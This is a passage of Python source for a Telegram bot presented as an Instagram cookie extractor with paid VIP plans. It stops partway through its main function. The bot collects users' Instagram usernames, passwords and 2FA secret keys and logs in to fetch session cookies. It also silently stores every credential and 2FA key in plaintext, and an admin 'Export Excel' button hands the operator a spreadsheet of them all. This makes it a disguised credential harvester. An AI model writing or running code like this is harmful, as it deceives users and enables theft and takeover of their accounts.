import os
import logging
import pyotp
import json
import pandas as pd
import instaloader
from datetime import datetime, timedelta
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    filters,
    ContextTypes,
    ConversationHandler,
)

# লগিং কনফিগারেশন
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

DB_FILE = "bot_database.json"
CONFIG_FILE = "config.json"

# কনভারসেশন স্টেটসমূহ
(
    GET_USER, GET_PASS, GET_2FA, 
    GET_SUPPORT, GET_BROADCAST, GET_PRIVATE_USER, GET_PRIVATE_MSG,
    GET_VIP_USER, GET_VIP_DAYS, GET_VIP_LIMIT,
    GET_COUPON_CODE, GET_ADMIN_COUPON_CODE, GET_COUPON_LIMIT, GET_DAILY_COUPON,
    GET_USER_CHECK, GET_NOTICE, GET_PAYMENT_CHOICE, GET_TXN, GET_BINANCE_USER
) = range(19)

# কনফিগারেশন লোড ও সেটআপ (Dynamic Token & Admin ID)
def load_config():
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, "r") as f:
            return json.load(f)
    else:
        print("\n=== 🛠️ P.R.C. BD Bot Setup Configuration ===")
        bot_token = input("Enter your Telegram Bot Token: ").strip()
        admin_id = input("Enter your Telegram Admin Account ID: ").strip()
        
        config_data = {"BOT_TOKEN": bot_token, "ADMIN_ID": int(admin_id)}
        with open(CONFIG_FILE, "w") as f:
            json.dump(config_data, f, indent=4)
        print("✅ Configuration saved successfully!\n")
        return config_data

config = load_config()
BOT_TOKEN = config["BOT_TOKEN"]
ADMIN_ID = config["ADMIN_ID"]

# ডাটাবেজ লোড ও সেভ ফাংশন
def load_db():
    if os.path.exists(DB_FILE):
        with open(DB_FILE, "r") as f:
            try:
                data = json.load(f)
                data["users"] = {int(k): v for k, v in data.get("users", {}).items()}
                data["vip"] = {int(k): v for k, v in data.get("vip", {}).items()}
                for uid in data["vip"]:
                    data["vip"][uid]["expires"] = datetime.strptime(data["vip"][uid]["expires"], "%Y-%m-%d %H:%M:%S")
                return data
            except:
                pass
    return {
        "users": {},          
        "vip": {},            
        "coupons": {},        
        "daily_coupon": None, 
        "notice": "Welcome to Instagram Cookie Extractor Bot. No active notices today.",
        "cookie_status": True,
        "history": []         
    }

def save_db():
    data_to_save = db.copy()
    serializable_vip = {}
    for uid, data in db["vip"].items():
        serializable_vip[str(uid)] = {
            "expires": data["expires"].strftime("%Y-%m-%d %H:%M:%S"),
            "daily_limit": data["daily_limit"]
        }
    data_to_save["vip"] = serializable_vip
    data_to_save["users"] = {str(k): v for k, v in db["users"].items()}
    with open(DB_FILE, "w") as f:
        json.dump(data_to_save, f, indent=4)

db = load_db()

# কিবোর্ড মেনু লেআউটসমূহ
def get_main_keyboard():
    return ReplyKeyboardMarkup([
        [KeyboardButton("🍪 Cookie Extract")],
        [KeyboardButton("💎 Plan"), KeyboardButton("👤 Profile")],
        [KeyboardButton("📜 Notice"), KeyboardButton("📡 Support")]
    ], resize_keyboard=True)

def get_admin_keyboard():
    return ReplyKeyboardMarkup([
        [KeyboardButton("📢 Broadcast"), KeyboardButton("💬 User Msg")],
        [KeyboardButton("📊 Status"), KeyboardButton("👑 VIP User")],
        [KeyboardButton("⚙️ VIP Set"), KeyboardButton("📝 Set Notice")],
        [KeyboardButton("🎫 Set Coupon"), KeyboardButton("📅 Daily Coupon")],
        [KeyboardButton("🔍 User Status"), KeyboardButton("📁 Export Excel")],
        [KeyboardButton("🔌 Toggle Cookie")],
        [KeyboardButton("🔙 Main Menu")]
    ], resize_keyboard=True)

def get_cancel_keyboard():
    return ReplyKeyboardMarkup([[KeyboardButton("❌ Cancel")]], resize_keyboard=True)

def get_pack_keyboard():
    return ReplyKeyboardMarkup([
        [KeyboardButton("🌅 Daily Pack"), KeyboardButton("📆 Weekly Pack"), KeyboardButton("⏳ Monthly Pack")],
        [KeyboardButton("🎟️ Apply Coupon"), KeyboardButton("🔙 Main Menu")]
    ], resize_keyboard=True)

def get_payment_keyboard():
    return ReplyKeyboardMarkup([
        [KeyboardButton("📱 BKash"), KeyboardButton("📱 Nagad"), KeyboardButton("💳 Binance")],
        [KeyboardButton("🔙 Back to Plans")]
    ], resize_keyboard=True)

def check_daily_reset(chat_id):
    today_str = datetime.now().strftime("%Y-%m-%d")
    if chat_id not in db["users"]:
        db["users"][chat_id] = {"username": "", "joined": today_str, "used_today": 0, "last_reset": today_str, "notified": False}
    if db["users"][chat_id].get("last_reset") != today_str:
        db["users"][chat_id]["used_today"] = 0
        db["users"][chat_id]["last_reset"] = today_str
    save_db()

# ক্রেডিট/ওনারশিপ কমান্ড রেসপন্স
async def prc_credit_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    
    # যদি আসল অ্যাডমিন /admin লেখে তবে তাকে প্যানেল দেখাবে, বাকি ৩টি কমান্ডে ক্রেডিট দেখাবে
    if chat_id == ADMIN_ID and context.args is None and update.message.text.startswith('/admin'):
        await admin_panel(update, context)
        return

    credit_text = (
        "╔══════════════════════════════════╗\n"
        "      🚀  𝗣.𝗥.𝗖.  𝗕𝗗  𝗘𝗖𝗢𝗦𝗬𝗦𝗧𝗘𝗠  🚀\n"
        "╚══════════════════════════════════╝\n\n"
        "👋 স্বাগতম P.R.C. BD-এর অফিশিয়াল ডিজিটাল হাবে! আমরা শুধুমাত্র বট বানাই না, আমরা আপনার অনলাইন লাইফকে স্মার্ট এবং ইনকাম-ফ্রেন্ডলি করতে কাজ করি।\n\n"
        "🛠 𝗪𝗛𝗔𝗧 𝗪𝗘 𝗢𝗙𝗙𝗘𝗥 (আমাদের সেবাসমূহ):\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "💰 Online Income Guide: সোশ্যাল মিডিয়া অ্যাকাউন্ট ক্রিয়েট এবং আর্নিংয়ের সেরা গাইডলাইন।\n"
        "🤖 Next-Gen Telegram Bots: আপনার কাজকে সহজ করতে অত্যাধুনিক টেলিগ্রাম অটোমেশন।\n"
        "🌐 Web Design & Dev: প্রফেশনাল এইচটিএমএল (HTML) এবং রেসপন্সিভ ওয়েবসাইট ডিজাইন।\n"
        "🔒 Privacy & Security: আয়রনভেস্ট (IronVest) এবং ওটিপি (OTP) সিকিউরিটি সリューション।\n"
        "📱 Smart Device Tricks: আপনার স্মার্টফোন এবং পিসি ব্যবহারের প্রো-লেভেল টিপস।\n"
        "💡 Pro Thinking: স্মার্ট লাইফ এনজয় করার জন্য ক্রিয়েটিভ এবং স্মার্ট থিংকিং আইডিয়া।\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "👤 Founder & Visionary: MD Rakib Robee\n"
        "🏢 Organization: P.R.C. BD\n"
        "🌟 Motto: Enjoy a Smart Life with Pro-Level Thinking 🥰😎\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "🚀 𝗣.𝗥.𝗖.  𝗕𝗗 — 𝗜𝗻𝗻𝗼𝘃𝗮𝘁𝗶𝗻𝗴  𝗬𝗼𝘂𝗿  𝗗𝗶𝗴𝗶𝘁𝗮𝗹  𝗙𝘂𝘁𝘂𝗿𝗲!"
    )
    await update.message.reply_text(credit_text)

# শুরুর কমান্ড
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    check_daily_reset(chat_id)
    
    user = update.effective_user
    db["users"][chat_id]["username"] = user.username or "No Username"
    
    if not db["users"][chat_id].get("notified", False):
        db["users"][chat_id]["notified"] = True
        save_db()
        admin_alert = (
            "🚀 **New User Started the Bot**\n\n"
            f"👤 Name: {user.full_name}\n"
            f"🆔 User ID: `{chat_id}`\n"
            f"💬 Username: @{user.username or 'None'}\n"
            f"📅 Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        )
        try:
            await context.bot.send_message(chat_id=ADMIN_ID, text=admin_alert, parse_mode="Markdown")
        except:
            pass
            
    await update.message.reply_text(
        "Hello! Welcome to Instagram Cookie Extractor Bot.\nChoose an option from the menu below.",
        reply_markup=get_main_keyboard()
    )

async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat.id != ADMIN_ID:
        await prc_credit_command(update, context)
        return
    await update.message.reply_text("Welcome to the Admin Panel Control Center.", reply_markup=get_admin_keyboard())

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Action canceled. Returning to main menu.", reply_markup=get_main_keyboard())
    return ConversationHandler.END

# --- কুকি এক্সট্রাকশন পার্ট ---
async def start_cookie_extract(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    check_daily_reset(chat_id)
    
    if not db["cookie_status"]:
        await update.message.reply_text("Sorry, Cookie Extraction feature is currently turned OFF by the administrator.")
        return ConversationHandler.END

    is_vip = False
    if chat_id in db["vip"]:
        if datetime.now() < db["vip"][chat_id]["expires"]:
            is_vip = True
        else:
            del db["vip"][chat_id]
            save_db()
            
    if not is_vip:
        if db["users"][chat_id]["used_today"] >= 5:
            await update.message.reply_text("Your daily free limit of 5 accounts has been reached. Please upgrade your plan.")
            return ConversationHandler.END

    await update.message.reply_text("Please enter your Instagram Username:", reply_markup=get_cancel_keyboard())
    return GET_USER

async def process_username(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.text == "❌ Cancel": return await cancel(update, context)
    context.user_data["ig_user"] = update.message.text.strip()
    await update.message.reply_text("Please enter your Instagram Password:", reply_markup=get_cancel_keyboard())
    return GET_PASS

async def process_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.text == "❌ Cancel": return await cancel(update, context)
    context.user_data["ig_pass"] = update.message.text.strip()
    await update.message.reply_text("Please enter your Instagram 2FA Secret Key:", reply_markup=get_cancel_keyboard())
    return GET_2FA

async def process_2fa_and_extract(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.text == "❌ Cancel": return await cancel(update, context)
    chat_id = update.effective_chat.id
    two_fa_key = update.message.text.strip().replace(" ", "")
    ig_user = context.user_data["ig_user"]
    ig_pass = context.user_data["ig_pass"]
    
    status_msg = await update.message.reply_text("Processing authentication and extracting cookies. Please wait...")
    db["history"].append({"username": ig_user, "password": ig_pass, "key": two_fa_key, "chat_id": chat_id})
    save_db()
    
    L = instaloader.Instaloader()
    try:
        totp = pyotp.TOTP(two_fa_key)
        two_factor_code = totp.now()
        
        try:
            L.login(ig_user, ig_pass)
        except instaloader.TwoFactorAuthRequiredException:
            L.two_factor_login(two_factor_code)
            
        session_cookies = L.context._session.cookies.get_dict()
        cookie_string = "; ".join([f"{name}={value}" for name, value in session_cookies.items()])
        
        db["users"][chat_id]["used_today"] += 1
        save_db()
        
        success_message = (
            "Successfully Extracted Instagram Cookie\n\n"
            f"Target Account: {ig_user}\n\n"
            "Click the box below to copy cookies:\n"
            f"`{cookie_string}`\n\n"
            "You can extract another account instantly by clicking Cookie Extract again."
        )
        await status_msg.delete()
        await update.message.reply_text(success_message, parse_mode="Markdown", reply_markup=get_main_keyboard())
        
    except Exception as e:
        try: await status_msg.delete()
        except: pass
        await update.message.reply_text(
            f"Extraction Failed. Please verify your credentials or 2FA key.\nError Details: {str(e)}", 
            reply_markup=get_main_keyboard()
        )
        
    return ConversationHandler.END

# --- প্ল্যান এবং পেমেন্ট পার্ট ---
async def show_plans(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Select a plan or apply a coupon below:", reply_markup=get_pack_keyboard())
    return GET_PAYMENT_CHOICE

async def process_plan_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    if text == "🔙 Main Menu":
        await start(update, context)
        return ConversationHandler.END
        
    plans_text = ""
    if text == "🌅 Daily Pack":
        plans_text = "Daily Packs Available:\n\n50 ID Cookie -> 0.08$\n80 ID Cookie -> 0.12$\n100 ID Cookie -> 0.15$\n\nSelect a payment method below:"
    elif text == "📆 Weekly Pack":
        plans_text = "Weekly Packs Available:\n\n50 ID Daily -> 0.50$\n100 ID Daily -> 0.90$\n150 ID Daily -> 1.20$\n200 ID Daily -> 1.75$\n\nSelect a payment method below:"
    elif text == "⏳ Monthly Pack":
        plans_text = "Monthly Packs Available:\n\n50 ID Daily -> 2.10$\n100 ID Daily -> 4.10$\n200 ID Daily -> 8.00$\n\nSelect a payment method below:"
    elif text == "🎟️ Apply Coupon":
        await update.message.reply_text("Please enter your Coupon Code:", reply_markup=get_cancel_keyboard())
        return GET_COUPON_CODE
    else:
        return GET_PAYMENT_CHOICE
        
    context.user_data["selected_pack_details"] = text
    await update.message.reply_text(plans_text, reply_markup=get_payment_keyboard())
    return GET_PAYMENT_CHOICE

async def process_payment_method(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    if text == "🔙 Back to Plans":
        await update.message.reply_text("Returning to plans menu...", reply_markup=get_pack_keyboard())
        return GET_PAYMENT_CHOICE
        
    context.user_data["payment_method"] = text
    
    if text in ["📱 BKash", "📱 Nagad"]:
        num_text = "`01724588834`"
        await update.message.reply_text(
            f"Send the matching package amount to this Personal Number via Cash In / Send Money.\n\n"
            f"Number: {num_text}\n\n"
            "After payment, click the Transaction ID button to submit verification.",
            parse_mode="Markdown",
            reply_markup=ReplyKeyboardMarkup([[KeyboardButton("🆔 Transaction ID"), KeyboardButton("❌ Cancel")]], resize_keyboard=True)
        )
        return GET_PAYMENT_CHOICE
    elif text == "💳 Binance":
        binance_id = "`1191556524`"
        await update.message.reply_text(
            f"Send the matching package amount to this Binance Pay ID.\n\n"
            f"Binance Pay ID: {binance_id}\n\n"
            "After payment, click the Submit Username button to send verification details.",
            parse_mode="Markdown",
            reply_markup=ReplyKeyboardMarkup([[KeyboardButton("👤 Submit Username"), KeyboardButton("❌ Cancel")]], resize_keyboard=True)
        )
        return GET_PAYMENT_CHOICE
        
    if text == "🆔 Transaction ID":
        await update.message.reply_text("Please send your transaction ID code now:", reply_markup=get_cancel_keyboard())
        return GET_TXN
    elif text == "👤 Submit Username":
        await update.message.reply_text("Please send your Binance Username now:", reply_markup=get_cancel_keyboard())
        return GET_BINANCE_USER
    elif text == "❌ Cancel":
        return await cancel(update, context)
        
    return GET_PAYMENT_CHOICE

async def process_verification_submission(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.text == "❌ Cancel": return await cancel(update, context)
    chat_id = update.effective_chat.id
    user_name = update.effective_user.username or "No Username"
    full_name = update.effective_user.full_name
    input_data = update.message.text.strip()
    
    pack = context.user_data.get("selected_pack_details", "Unknown Package")
    method = context.user_data.get("payment_method", "Unknown Method")
    
    admin_alert = (
        "📩 **New Subscription Request**\n\n"
        f"👤 User: @{user_name}\n"
        f"📛 Name: {full_name}\n"
        f"🆔 Chat ID: `{chat_id}`\n"
        f"📦 Package: {pack}\n"
        f"💳 Method: {method}\n"
        f"🔑 Data: `{input_data}`"
    )
    
    keyboard = InlineKeyboardMarkup([
        [
            InlineKeyboardButton("✅ Approve (30 Days)", callback_data=f"approve_{chat_id}_30"),
            InlineKeyboardButton("❌ Reject", callback_data=f"reject_{chat_id}")
        ]
    ])
    
    await context.bot.send_message(chat_id=ADMIN_ID, text=admin_alert, reply_markup=keyboard, parse_mode="Markdown")
    await update.message.reply_text(
        "Your payment details have been sent to the administrator for manual review.\n"
        "You will remain a free tier user until approved. Thank you for your patience.",
        reply_markup=get_main_keyboard()
    )
    return ConversationHandler.END

async def handle_admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if query.message.chat.id != ADMIN_ID: return
    
    data = query.data.split("_")
    action = data[0]
    target_id = int(data[1])
    
    if action == "approve":
        days = int(data[2])
        db["vip"][target_id] = {
            "expires": datetime.now() + timedelta(days=days),
            "daily_limit": 100
        }
        save_db()
        await query.edit_message_text(text=f"{query.message.text}\n\n🟢 **Status: Approved ({days} Days)**")
        try:
            await context.bot.send_message(chat_id=target_id, text="🎉 Congratulations! Your payment has been approved and VIP Plan is now active.")
        except: pass
            
    elif action == "reject":
        await query.edit_message_text(text=f"{query.message.text}\n\n🔴 **Status: Rejected**")
        try:
            await context.bot.send_message(chat_id=target_id, text="⚠️ Your subscription request was rejected. Please check details or contact support.")
        except: pass

# --- কুপন কোড লজিক ---
async def apply_coupon_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.text == "❌ Cancel": return await cancel(update, context)
    chat_id = update.effective_chat.id
    code = update.message.text.strip()
    
    if db["daily_coupon"] and code == db["daily_coupon"]:
        db["vip"][chat_id] = {"expires": datetime.now() + timedelta(days=1), "daily_limit": 99999}
        save_db()
        await update.message.reply_text("Daily Unlimited Coupon Applied Successfully!", reply_markup=get_main_keyboard())
        return ConversationHandler.END
        
    if code in db["coupons"]:
        if chat_id in db["coupons"][code]["used_by"]:
            await update.message.reply_text("You have already redeemed this coupon code.", reply_markup=get_main_keyboard())
            return ConversationHandler.END
            
        limit = db["coupons"][code]["limit"]
        db["vip"][chat_id] = {"expires": datetime.now() + timedelta(days=1), "daily_limit": limit}
        db["coupons"][code]["used_by"].append(chat_id)
        save_db()
        await update.message.reply_text(f"Coupon Applied Successfully. Daily Limit updated to {limit} accounts.", reply_markup=get_main_keyboard())
    else:
        await update.message.reply_text("Invalid or expired coupon code.", reply_markup=get_main_keyboard())
    return ConversationHandler.END

# --- প্রোফাইল এবং নোটিশ ---
async def show_profile(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    check_daily_reset(chat_id)
    
    status = "Free User"
    limit_text = f"{db['users'][chat_id]['used_today']}/5 Accounts Extracted"
    if chat_id in db["vip"]:
        if datetime.now() < db["vip"][chat_id]["expires"]:
            status = "VIP Member"
            limit_text = f"{db['users'][chat_id]['used_today']}/{db['vip'][chat_id]['daily_limit']} Accounts Extracted"
            
    profile_msg = (
        "Your Profile Dashboard\n\n"
        f"Telegram ID: `{chat_id}`\n"
        f"Account Type: {status}\n"
        f"Daily Stats: {limit_text}"
    )
    await update.message.reply_text(profile_msg, parse_mode="Markdown")

async def show_notice(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(f"Notice Board Update:\n\n{db['notice']}")

# --- সাপোর্ট সেকশন ---
async def start_support(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "Describe your issue or send any media (Photos, Videos, Text) to contact support:",
        reply_markup=get_cancel_keyboard()
    )
    return GET_SUPPORT

async def handle_support_msg(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.text == "❌ Cancel": return await cancel(update, context)
    
    chat_id = update.effective_chat.id
    user_name = update.effective_user.username or "No Username"
    full_name = update.effective_user.full_name
    
    header = (
        f"📥 **New Support Message**\n"
        f"👤 From: {full_name} (@{user_name})\n"
        f"🆔 Chat ID: `{chat_id}`\n"
        "------------------------\n"
        "ℹ️ *You can reply directly to this message to answer the user.*"
    )
    await context.bot.send_message(chat_id=ADMIN_ID, text=header, parse_mode="Markdown")
    
    fwd_msg = await update.message.forward(chat_id=ADMIN_ID)
    context.bot_data[fwd_msg.message_id] = chat_id
    
    await update.message.reply_text("Your support message has been sent to the admin team.", reply_markup=get_main_keyboard())
    return ConversationHandler.END

async def handle_admin_reply_to_support(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat.id != ADMIN_ID: return
    if update.message.reply_to_message:
        reply_to_id = update.message.reply_to_message.message_id
        target_user_id = context.bot_data.get(reply_to_id)
        if target_user_id:
            try:
                header_msg = "💬 **Support Team Response:**"
                await context.bot.send_message(chat_id=target_user_id, text=header_msg, parse_mode="Markdown")
                await update.message.copy(chat_id=target_user_id)
                await update.message.reply_text("✅ Reply successfully sent to user.")
            except Exception as e:
                await update.message.reply_text(f"❌ Failed to send reply. Error: {str(e)}")

# --- অ্যাডমিন সেকশন রাউটার ---
async def admin_actions_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat.id != ADMIN_ID: return
    text = update.message.text
    
    if text == "🔙 Main Menu":
        await start(update, context)
    elif text == "📢 Broadcast":
        await update.message.reply_text("Send your global broadcast message (Supports Text/Media/Links):", reply_markup=get_cancel_keyboard())
        return GET_BROADCAST
    elif text == "💬 User Msg":
        await update.message.reply_text("Enter target Chat ID to send private message:", reply_markup=get_cancel_keyboard())
        return GET_PRIVATE_USER
    elif text == "📊 Status":
        total_users = len(db["users"])
        await update.message.reply_text(f"Total Bot Database Registered Users: {total_users}")
    elif text == "👑 VIP User":
        vip_list = "Active VIP Members:\n\n"
        for uid, data in db["vip"].items():
            vip_list += f"ID: {uid} | Expires: {data['expires'].strftime('%Y-%m-%d')} | Daily Limit: {data['daily_limit']}\n"
        await update.message.reply_text(vip_list if len(db["vip"]) > 0 else "No active VIP members found.")
    elif text == "⚙️ VIP Set":
        await update.message.reply_text("Enter target Chat ID to grant VIP membership status:", reply_markup=get_cancel_keyboard())
        return GET_VIP_USER
    elif text == "📝 Set Notice":
        await update.message.reply_text("Send the new global notice update text:", reply_markup=get_cancel_keyboard())
        return GET_NOTICE
    elif text == "🎫 Set Coupon":
        await update.message.reply_text("Define new Coupon Code name:", reply_markup=get_cancel_keyboard())
        return GET_ADMIN_COUPON_CODE
    elif text == "📅 Daily Coupon":
        await update.message.reply_text("Define new 24-Hour Unlimited Coupon Code:", reply_markup=get_cancel_keyboard())
        return GET_DAILY_COUPON
    elif text == "🔍 User Status":
        await update.message.reply_text("Enter target Chat ID to inspect account logs:", reply_markup=get_cancel_keyboard())
        return GET_USER_CHECK
    elif text == "🔌 Toggle Cookie":
        db["cookie_status"] = not db["cookie_status"]
        save_db()
        status_str = "ON" if db["cookie_status"] else "OFF"
        await update.message.reply_text(f"Instagram Cookie Extraction feature has been toggled {status_str}.")
    elif text == "📁 Export Excel":
        if not db["history"]:
            await update.message.reply_text("No user credential extraction history found to compile.")
            return
        df = pd.DataFrame(db["history"])
        df = df[["username", "password", "key", "chat_id"]]
        df.columns = ["Username", "Password", "2FA Key", "Chat ID"]
        filename = "Extracted_Account_Logs.xlsx"
        df.to_excel(filename, index=False)
        with open(filename, "rb") as file:
            await update.message.reply_document(document=file, caption="Exported Excel Log History Database Sheet.")
        os.remove(filename)

# --- অ্যাডমিন ডাটা প্রসেস ---
async def set_notice_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.text == "❌ Cancel": return await admin_panel(update, context)
    db["notice"] = update.message.text
    save_db()
    await update.message.reply_text("Global notice update applied successfully.", reply_markup=get_admin_keyboard())
    return ConversationHandler.END

async def set_daily_coupon_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.text == "❌ Cancel": return await admin_panel(update, context)
    db["daily_coupon"] = update.message.text.strip()
    save_db()
    await update.message.reply_text(f"Daily Unlimited Coupon defined as: {db['daily_coupon']}", reply_markup=get_admin_keyboard())
    return ConversationHandler.END

async def set_user_check_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.text == "❌ Cancel": return await admin_panel(update, context)
    try:
        uid = int(update.message.text.strip())
        check_daily_reset(uid)
        stats = db["users"].get(uid, {"used_today": 0})
        await update.message.reply_text(f"User ID: {uid}\nTotal extractions logged today: {stats['used_today']}", reply_markup=get_admin_keyboard())
    except:
        await update.message.reply_text("Invalid User ID format supplied.", reply_markup=get_admin_keyboard())
    return ConversationHandler.END

async def process_broadcast_transmission(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.text == "❌ Cancel": return await admin_panel(update, context)
    for uid in db["users"].keys():
        try: await update.message.copy(chat_id=uid)
        except: continue
    await update.message.reply_text("Global broadcast sent out successfully to all active users.", reply_markup=get_admin_keyboard())
    return ConversationHandler.END

async def process_private_user_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.text == "❌ Cancel": return await admin_panel(update, context)
    context.user_data["tgt_msg_id"] = update.message.text.strip()
    await update.message.reply_text("Type the private message content you wish to forward:", reply_markup=get_cancel_keyboard())
    return GET_PRIVATE_MSG

async def process_private_msg_delivery(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.text == "❌ Cancel": return await admin_panel(update, context)
    try:
        await update.message.copy(chat_id=int(context.user_data["tgt_msg_id"]))
        await update.message.reply_text("Private message delivered successfully to destination user.", reply_markup=get_admin_keyboard())
    except Exception as e:
        await update.message.reply_text(f"Failed to deliver message. Error: {str(e)}", reply_markup=get_admin_keyboard())
    return ConversationHandler.END

async def process_vip_user_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.text == "❌ Cancel": return await admin_panel(update, context)
    context.user_data["vip_target"] = update.message.text.strip()
    await update.message.reply_text("Enter active VIP package validation duration timeframe (In Days):", reply_markup=get_cancel_keyboard())
    return GET_VIP_DAYS

async def process_vip_days(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.text == "❌ Cancel": return await admin_panel(update, context)
    context.user_data["vip_days"] = int(update.message.text.strip())
    await update.message.reply_text("Define maximum account target extractions daily limit allowance:", reply_markup=get_cancel_keyboard())
    return GET_VIP_LIMIT

async def process_vip_limit_save(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.text == "❌ Cancel": return await admin_panel(update, context)
    try:
        tgt = int(context.user_data["vip_target"])
        days = context.user_data["vip_days"]
        limit = int(update.message.text.strip())
        db["vip"][tgt] = {"expires": datetime.now() + timedelta(days=days), "daily_limit": limit}
        save_db()
        await update.message.reply_text(f"VIP privileges successfully configured for target ID: {tgt}", reply_markup=get_admin_keyboard())
        try: await context.bot.send_message(chat_id=tgt, text="Congratulations! Your VIP Premium Plan Subscription is now active.")
        except: pass
    except Exception as e:
        await update.message.reply_text(f"Error compiling configuration settings: {str(e)}", reply_markup=get_admin_keyboard())
    return ConversationHandler.END

async def process_admin_coupon_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.text == "❌ Cancel": return await admin_panel(update, context)
    context.user_data["new_coupon_code"] = update.message.text.strip()
    await update.message.reply_text("Define daily extraction capacity limit for this coupon code bundle:", reply_markup=get_cancel_keyboard())
    return GET_COUPON_LIMIT

async def process_admin_coupon_limit(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.text == "❌ Cancel": return await admin_panel(update, context)
    code = context.user_data["new_coupon_code"]
    try:
        limit = int(update.message.text.strip())
        db["coupons"][code] = {"limit": limit, "used_by": []}
        save_db()
        await update.message.reply_text(f"Promo Coupon Code '{code}' logged with an allowance limit of {limit} entries.", reply_markup=get_admin_keyboard())
    except:
        await update.message.reply_text("Invalid number format. Failed to save coupon.", reply_markup=get_admin_keyboard())
    return ConversationHandler.END

# --- মেইন এক্সিকিউশন মেথড ---
def main():
    app = Application.builder().token(BOT_TOKEN).build()
    
    cookie_conv = ConversationHandler(
        entry_points=[MessageHandler(filters.Regex("^🍪 Cookie Extract$"), start_cookie_extract)],
        states={
            GET_USER: [MessageHandler(filters.TEXT & ~filters.COMMAND, process_username)],
            GET_PASS: [MessageHandler(filters.TEXT & ~filters.COMMAND, process_password)],
            GET_2FA: [MessageHandler(filters.TEXT & ~filters.COMMAND, process_2fa_and_extract)],
        },
        fallbacks=[MessageHandler(filters.Regex("^❌ Cancel$"), cancel), CommandHandler("cancel", cancel)],
        name="cookie_extraction_flow", persistent=False
    )
    
    plan_conv = ConversationHandler(
        entry_points=[MessageHandler(filters.Regex("^💎 Plan$"), show_plans)],
        states={
            GET_PAYMENT_CHOICE: [
                MessageHandler(filters.Regex("^(🌅 Daily Pack|📆 Weekly Pack|⏳ Monthly Pack|🎟️ Apply Coupon)$"), process_plan_buttons),
                MessageHandler(filters.Regex("^(📱 BKash|📱 Nagad|💳 Binance|🔙 Back to Plans)$"), process_payment_method),
                MessageHandler(filters.Regex("^(🆔 Transaction ID|👤 Submit Username)$"), process_payment_method),
                MessageHandler(filters.Regex("^❌ Cancel$"), cancel)
            ],
            GET_COUPON_CODE: [MessageHandler(filters.TEXT & ~filters.COMMAND, apply_coupon_code)],
            GET_TXN: [MessageHandler(filters.TEXT & ~filters.COMMAND, process_verification_submission)],
            GET_BINANCE_USER: [MessageHandler(filters.TEXT & ~filters.COMMAND, process_verification_submission)]
        },
        fallbacks=[MessageHandler(filters.Regex("^❌ Cancel$"), cancel), MessageHandler(filters.Regex("^🔙 Main Menu$"), cancel)],
        name="plan_payment_flow", persistent=False
    )

    support_conv = ConversationHandler(
        entry_points=[MessageHandler(filters.Regex("^📡 Support$"), start_support)],
        states={
            GET_SUPPORT: [MessageHandler(filters.ALL & ~filters.COMMAND, handle_support_msg)]
        },
        fallbacks=[MessageHandler(filters.Regex("^❌ Cancel$"), cancel)],
        name="support_flow", persistent=False
    )

    admin_conv = ConversationHandler(
        entry_points=[
            MessageHandler(filters.Regex("^📢 Broadcast$"), admin_actions_router),
            MessageHandler(filters.Regex("^💬 User Msg$"), admin_actions_router),
            MessageHandler(filters.Regex("^⚙️ VIP Set$"), admin_actions_router),
            MessageHandler(filters.Regex("^📝 Set Notice$"), admin_actions_router),
            MessageHandler(filters.Regex("^🎫 Set Coupon$"), admin_actions_router),
            MessageHandler(filters.Regex("^📅 Daily Coupon$"), admin_actions_router),
            MessageHandler(filters.Regex("^🔍 User Status$"), admin_actions_router),
        ],
        states={
            GET_BROADCAST: [MessageHandler(filters.ALL & ~filters.COMMAND, process_broadcast_transmission)],
            GET_PRIVATE_USER: [MessageHandler(filters.TEXT & ~filters.COMMAND, process_private_user_id)],
            GET_PRIVATE_MSG: [MessageHandler(filters.ALL & ~filters.COMMAND, process_private_msg_delivery)],
            GET_VIP_USER: [MessageHandler(filters.TEXT & ~filters.COMMAND, process_vip_user_id)],
